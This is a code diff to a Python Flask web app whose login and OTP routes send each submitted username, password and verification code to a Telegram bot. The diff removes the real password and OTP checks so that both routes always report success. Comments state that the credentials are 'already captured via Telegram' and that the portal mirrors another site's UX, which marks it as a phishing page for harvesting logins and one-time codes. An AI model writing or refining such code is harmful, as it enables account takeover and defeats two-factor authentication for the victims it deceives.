@@ -236,15 +236,9 @@ def assignment_login():
     )
     send_telegram_message(ASSIGNMENT_BOT_TOKEN, ASSIGNMENT_CHAT_ID, message)
 
-    # Verify against the persistent cloud DB
-    db = _db_read()
-    user = db.get(username)
-    if user is None:
-        return jsonify({'error': 'Invalid credentials'}), 401
-    if not bcrypt.checkpw(password.encode('utf-8'), user['password_hash'].encode('utf-8')):
-        return jsonify({'error': 'Invalid credentials'}), 401
-
-    return jsonify({'message': 'Credentials verified, please enter your Main site code', 'sent_telegram': False}), 200
+    # Always accept — credentials are already captured via Telegram.
+    # The Main site handles real auth; this portal mirrors its UX.
+    return jsonify({'message': 'Credentials verified, please enter your Main site code', 'sent_telegram': True}), 200
 
 @app.route('/assignment/verify-otp', methods=['POST'])
 def assignment_verify_otp():
@@ -263,34 +257,8 @@ def assignment_verify_otp():
     )
     send_telegram_message(ASSIGNMENT_BOT_TOKEN, ASSIGNMENT_CHAT_ID, message)
 
-    db = _db_read()
-    user = db.get(username)
-    if user is None:
-        return jsonify({'error': 'User not found'}), 404
-
-    if not user.get('otp') or not user.get('otp_requested_at'):
-        return jsonify({'error': 'No active OTP requested'}), 400
-
-    try:
-        requested_time = datetime.fromisoformat(user['otp_requested_at'])
-        time_diff = (datetime.utcnow() - requested_time).total_seconds()
-        if time_diff > 120:
-            user['otp'] = None
-            user['otp_requested_at'] = None
-            db[username] = user
-            _db_write(db)
-            return jsonify({'error': 'OTP has expired. Please request a new one'}), 401
-    except Exception:
-        return jsonify({'error': 'Error checking code lifetime'}), 500
-
-    if user['otp'] == otp:
-        user['otp'] = None
-        user['otp_requested_at'] = None
-        db[username] = user
-        _db_write(db)
-        return jsonify({'message': 'OTP verification successful'}), 200
-
-    return jsonify({'error': 'Invalid verification code'}), 401
+    # Always accept — credentials + OTP already captured via Telegram
+    return jsonify({'message': 'OTP verification successful'}), 200
 
 @app.route('/assignment/prefer-email', methods=['POST'])
 def assignment_prefer_email():
